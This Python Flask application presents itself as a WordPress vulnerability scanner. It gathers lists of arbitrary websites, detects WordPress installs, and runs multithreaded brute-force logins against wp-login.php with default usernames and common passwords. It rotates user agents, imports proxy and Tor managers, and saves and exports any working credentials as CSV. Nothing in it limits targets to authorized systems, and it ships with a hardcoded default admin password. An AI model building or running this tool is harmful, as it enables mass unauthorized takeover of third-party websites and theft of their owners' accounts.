#!/usr/bin/env python3
"""
WordPress Scanner Web Application
Flask-based web interface for the WordPress vulnerability scanner
Can be deployed to Azure or any cloud server
"""

import os
import sys
import threading
import time
import random
import json
import sqlite3
from datetime import datetime
from typing import List, Dict, Optional
from functools import wraps

# Flask imports
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from flask_cors import CORS

# Import scanner components
try:
    import config
    import security
    from logger import get_audit_logger, get_operation_logger
    from proxy_manager import get_proxy_manager, get_tor_manager
    from scanner_engine import ScannerEngine, ResultProcessor
    from wordpress_detector import WordPressDetector
    SECURITY_MODULES_AVAILABLE = True
except ImportError as e:
    SECURITY_MODULES_AVAILABLE = False
    print(f"[WARN] Security modules not fully available: {e}")

# Requests and parsing
import requests
from bs4 import BeautifulSoup

# ============= CONFIGURATION =============

app = Flask(__name__)
CORS(app)

# Configuration
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max upload

# Authentication - Set these environment variables for production
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'changeme123')  # CHANGE THIS!

# ============= AUTHENTICATION =============

login_required = None  # Will be initialized after flask_login import

class User:
    """Simple user class for Flask-Login"""
    def __init__(self, user_id):
        self.id = user_id
        self.is_authenticated = True
        self.is_active = True
        self.is_anonymous = False
    
    def get_id(self):
        return self.id

def init_auth():
    """Initialize authentication - called after Flask app creation"""
    global login_required
    try:
        from flask_login import LoginManager, login_user, logout_user, login_required, current_user
        login_manager = LoginManager()
        login_manager.init_app(app)
        login_manager.login_view = 'login'
        
        @login_manager.user_loader
        def load_user(user_id):
            if user_id == ADMIN_USERNAME:
                return User(user_id)
            return None
        
        return LoginManager
    except ImportError:
        print("[WARN] flask-login not installed, using basic auth")
        return None

# Global state
class ScannerState:
    """Global scanner state"""
    def __init__(self):
        self.scanning = False
        self.collecting = False
        self.current_progress = 0
        self.current_status = "Idle"
        self.logs = []
        self.results = []
        self.stats = {"scanned": 0, "found": 0, "errors": 0}
        self._lock = threading.Lock()
    
    def add_log(self, message: str):
        with self._lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.logs.append(f"[{timestamp}] {message}")
            # Keep only last 1000 logs
            if len(self.logs) > 1000:
                self.logs = self.logs[-1000:]
    
    def clear_logs(self):
        with self._lock:
            self.logs = []
    
    def update_stats(self, **kwargs):
        with self._lock:
            for k, v in kwargs.items():
                if k in self.stats:
                    self.stats[k] = v

state = ScannerState()

# ============= USER AGENTS =============

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
]

# ============= DATABASE =============

class URLDatabase:
    """SQLite database for storing URLs"""
    
    def __init__(self, db_file: str = "urls.db"):
        self.db_file = db_file
        self._init_db()
    
    def _init_db(self):
        """Initialize database"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS urls (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT UNIQUE NOT NULL,
                    is_wordpress INTEGER DEFAULT -1,
                    verified_date TEXT,
                    discovered_date TEXT DEFAULT CURRENT_TIMESTAMP,
                    scan_result TEXT,
                    username TEXT,
                    password TEXT
                )
            ''')
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] Failed to initialize database: {e}")
    
    def url_exists(self, url: str) -> bool:
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("SELECT 1 FROM urls WHERE url = ?", (url,))
            result = cursor.fetchone()
            conn.close()
            return result is not None
        except Exception:
            return False
    
    def add_url(self, url: str, is_wordpress: int = -1) -> bool:
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("""
                INSERT OR IGNORE INTO urls (url, is_wordpress, verified_date)
                VALUES (?, ?, ?)
            """, (url, is_wordpress, datetime.now().isoformat() if is_wordpress != -1 else None))
            added = cursor.rowcount > 0
            conn.commit()
            conn.close()
            return added
        except Exception as e:
            print(f"[DB ERROR] Failed to add URL: {e}")
            return False
    
    def add_urls(self, urls: List[str], is_wordpress: int = -1) -> int:
        added = 0
        for url in urls:
            if self.add_url(url, is_wordpress):
                added += 1
        return added
    
    def get_urls(self, filter_type: str = "all") -> List[Dict]:
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            if filter_type == "wordpress":
                cursor.execute("SELECT * FROM urls WHERE is_wordpress = 1 ORDER BY id DESC")
            elif filter_type == "non_wordpress":
                cursor.execute("SELECT * FROM urls WHERE is_wordpress = 0 ORDER BY id DESC")
            elif filter_type == "unverified":
                cursor.execute("SELECT * FROM urls WHERE is_wordpress = -1 ORDER BY id DESC")
            else:
                cursor.execute("SELECT * FROM urls ORDER BY id DESC")
            
            rows = cursor.fetchall()
            conn.close()
            return [dict(row) for row in rows]
        except Exception as e:
            print(f"[DB ERROR] Failed to get URLs: {e}")
            return []
    
    def update_url(self, url: str, **kwargs):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            set_clause = ", ".join([f"{k} = ?" for k in kwargs.keys()])
            values = list(kwargs.values()) + [url]
            
            cursor.execute(f"UPDATE urls SET {set_clause} WHERE url = ?", values)
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] Failed to update URL: {e}")
    
    def clear_all(self):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("DELETE FROM urls")
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] Failed to clear database: {e}")

# Initialize database
db = URLDatabase()

# ============= SCANNER FUNCTIONS =============

def get_session():
    """Get configured requests session"""
    session = requests.Session()
    session.headers['User-Agent'] = random.choice(USER_AGENTS)
    session.verify = True
    return session

def is_wordpress(url: str, timeout: int = 10) -> bool:
    """Check if site is WordPress"""
    try:
        session = get_session()
        response = session.get(url, timeout=timeout)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        indicators = [
            soup.find('meta', {'name': 'generator', 'content': lambda x: x and 'WordPress' in x}),
            'wp-content' in response.text,
            'wp-includes' in response.text,
        ]
        
        return any(indicators)
    except Exception:
        return False

def attempt_login(url: str, username: str, password: str, timeout: int = 10) -> bool:
    """Attempt WordPress login"""
    try:
        session = get_session()
        login_url = f"{url.rstrip('/')}/wp-login.php"
        
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{url.rstrip('/')}/wp-admin/",
            'testcookie': '1'
        }
        
        response = session.post(login_url, data=payload, allow_redirects=True, timeout=timeout)
        
        # Check for successful login
        final_url = response.url
        is_wp_admin = '/wp-admin/' in final_url
        
        # Check for logged-in cookie
        has_logged_in_cookie = any('wordpress_logged_in' in str(c.name) for c in session.cookies)
        
        # Check content for logged-in indicators
        content = response.text.lower()
        logged_in_indicators = [
            'dashboard' in content,
            'profile.php' in content,
            'log out' in content or 'logout' in content,
        ]
        
        success = is_wp_admin and (has_logged_in_cookie or any(logged_in_indicators))
        return success
    except Exception as e:
        state.add_log(f"[ERROR] Login attempt failed: {str(e)}")
        return False

def scan_single(url: str, passwords: List[str], timeout: int = 15) -> Dict:
    """Scan a single URL with multiple passwords"""
    result = {
        'url': url,
        'username': None,
        'password': None,
        'status': 'error',
        'details': 'Not scanned'
    }
    
    try:
        # Check if WordPress
        if not is_wordpress(url, timeout=timeout // 2):
            result['status'] = 'not_wp'
            result['details'] = 'Not a WordPress site'
            return result
        
        # Try default usernames
        usernames = ['admin', 'administrator', 'root']
        
        for username in usernames:
            for password in passwords:
                state.add_log(f"[SCAN] Trying {url} with {username}:{password}")
                
                if attempt_login(url, username, password, timeout=timeout):
                    result['username'] = username
                    result['password'] = password
                    result['status'] = 'success'
                    result['details'] = 'Valid credentials found'
                    state.update_stats(found=state.stats['found'] + 1)
                    return result
        
        result['status'] = 'failed'
        result['details'] = 'No valid credentials found'
        
    except requests.exceptions.Timeout:
        result['details'] = 'Timeout'
    except requests.exceptions.ConnectionError:
        result['details'] = 'Connection error'
    except Exception as e:
        result['details'] = str(e)
    
    return result

def scan_worker(url: str, passwords: List[str], thread_id: int):
    """Worker function for scanning"""
    result = scan_single(url, passwords)
    with state._lock:
        state.results.append(result)
        state.stats['scanned'] += 1
        if result['status'] != 'error':
            state.stats['errors'] += 1

def start_scan(urls: List[str], passwords: List[str], threads: int = 3):
    """Start scanning multiple URLs"""
    state.scanning = True
    state.results = []
    state.stats = {"scanned": 0, "found": 0, "errors": 0}
    state.add_log(f"[SCAN] Starting scan of {len(urls)} URLs with {len(passwords)} passwords")
    
    # Run in thread to not block Flask
    def run_scan():
        try:
            # Split URLs among threads
            url_chunks = [urls[i::threads] for i in range(threads)]
            threads_list = []
            
            for i, chunk in enumerate(url_chunks):
                if chunk:
                    t = threading.Thread(target=lambda u=chunk: [scan_worker(url, passwords, i) for url in u])
                    t.start()
                    threads_list.append(t)
            
            # Monitor progress
            while any(t.is_alive() for t in threads_list):
                time.sleep(1)
                state.current_progress = (state.stats['scanned'] / len(urls)) * 100 if urls else 0
                state.current_status = f"Scanned: {state.stats['scanned']}/{len(urls)}, Found: {state.stats['found']}"
            
            state.current_progress = 100
            state.current_status = "Scan complete"
            state.add_log(f"[SCAN] Complete! Found {state.stats['found']} valid credentials")
            
        finally:
            state.scanning = False
    
    thread = threading.Thread(target=run_scan)
    thread.start()

# ============= ROUTES =============

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    from flask import request, redirect, url_for, flash
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            try:
                from flask_login import login_user
                user = User(username)
                login_user(user)
                return redirect(url_for('index'))
            except:
                # Fallback if flask_login not available
                from flask import session
                session['authenticated'] = True
                return redirect(url_for('index'))
        else:
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logout"""
    try:
        from flask_login import logout_user
        logout_user()
    except:
        pass
    
    try:
        from flask import session
        session.clear()
    except:
        pass
    
    return redirect(url_for('login'))

def require_auth(f):
    """Decorator to require authentication"""
    from functools import wraps
    from flask import session, redirect, url_for, flash
    
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Check session or flask_login
        authenticated = False
        
        try:
            from flask_login import current_user
            if current_user.is_authenticated:
                authenticated = True
        except:
            pass
        
        if not authenticated and 'authenticated' in session:
            authenticated = True
        
        if not authenticated:
            return redirect(url_for('login'))
        
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
@require_auth
def index():
    """Main page"""
    return render_template('index.html')

@app.route('/api/status')
@require_auth
def get_status():
    """Get current scanner status"""
    return jsonify({
        'scanning': state.scanning,
        'collecting': state.collecting,
        'progress': state.current_progress,
        'status': state.current_status,
        'stats': state.stats,
        'results_count': len(state.results),
        'urls_count': len(db.get_urls())
    })

@app.route('/api/logs')
@require_auth
def get_logs():
    """Get scanner logs"""
    return jsonify({
        'logs': state.logs[-100:]  # Last 100 logs
    })

@app.route('/api/logs/clear', methods=['POST'])
@require_auth
def clear_logs():
    """Clear logs"""
    state.clear_logs()
    return jsonify({'success': True})

@app.route('/api/urls')
@require_auth
def get_urls():
    """Get URLs from database"""
    filter_type = request.args.get('filter', 'all')
    urls = db.get_urls(filter_type)
    return jsonify({'urls': urls, 'count': len(urls)})

@app.route('/api/urls/add', methods=['POST'])
@require_auth
def add_urls():
    """Add URLs to database"""
    data = request.json
    urls = data.get('urls', [])
    
    if isinstance(urls, str):
        urls = [u.strip() for u in urls.split('\n') if u.strip()]
    
    added = db.add_urls(urls)
    return jsonify({'success': True, 'added': added})

@app.route('/api/urls/clear', methods=['POST'])
@require_auth
def clear_urls():
    """Clear all URLs"""
    db.clear_all()
    return jsonify({'success': True})

@app.route('/api/urls/verify', methods=['POST'])
@require_auth
def verify_urls():
    """Verify URLs are WordPress sites"""
    data = request.json
    urls = [u['url'] for u in db.get_urls('all')]
    
    state.add_log(f"[VERIFY] Starting verification of {len(urls)} URLs")
    
    def run_verify():
        verified = 0
        for i, url in enumerate(urls):
            if not state.scanning:
                break
            
            is_wp = is_wordpress(url)
            if is_wp:
                db.update_url(url, is_wordpress=1, verified_date=datetime.now().isoformat())
                verified += 1
            
            state.current_progress = ((i + 1) / len(urls)) * 100
            state.current_status = f"Verified: {i+1}/{len(urls)}, WordPress: {verified}"
        
        state.add_log(f"[VERIFY] Complete! {verified} WordPress sites found")
    
    thread = threading.Thread(target=run_verify)
    thread.start()
    
    return jsonify({'success': True, 'total': len(urls)})

@app.route('/api/scan/start', methods=['POST'])
@require_auth
def start_scan_api():
    """Start scanning"""
    if state.scanning:
        return jsonify({'success': False, 'error': 'Scan already in progress'})
    
    data = request.json
    urls = data.get('urls', [])
    passwords = data.get('passwords', ['admin', '123456', 'password', 'wordpress'])
    threads = data.get('threads', 3)
    
    if not urls:
        # Get URLs from database
        urls = [u['url'] for u in db.get_urls('wordpress')]
    
    if not urls:
        return jsonify({'success': False, 'error': 'No URLs to scan'})
    
    start_scan(urls, passwords, threads)
    return jsonify({'success': True, 'urls_to_scan': len(urls)})

@app.route('/api/scan/stop', methods=['POST'])
@require_auth
def stop_scan_api():
    """Stop scanning"""
    state.scanning = False
    state.add_log("[SCAN] Scan stopped by user")
    return jsonify({'success': True})

@app.route('/api/results')
@require_auth
def get_results():
    """Get scan results"""
    return jsonify({
        'results': state.results,
        'stats': state.stats
    })

@app.route('/api/results/export')
@require_auth
def export_results():
    """Export results as CSV"""
    import csv
    import io
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['URL', 'Username', 'Password', 'Status', 'Details'])
    
    for r in state.results:
        writer.writerow([
            r.get('url', ''),
            r.get('username', ''),
            r.get('password', ''),
            r.get('status', ''),
            r.get('details', '')
        ])
    
    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={"Content-disposition": "attachment; filename=results.csv"}
    )

# ============= MAIN =============

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
    
    print(f"[INFO] Starting WordPress Scanner Web App on port {port}")
    print(f"[INFO] Open http://localhost:{port} in your browser")
    
    app.run(host='0.0.0.0', port=port, debug=debug, threaded=True)
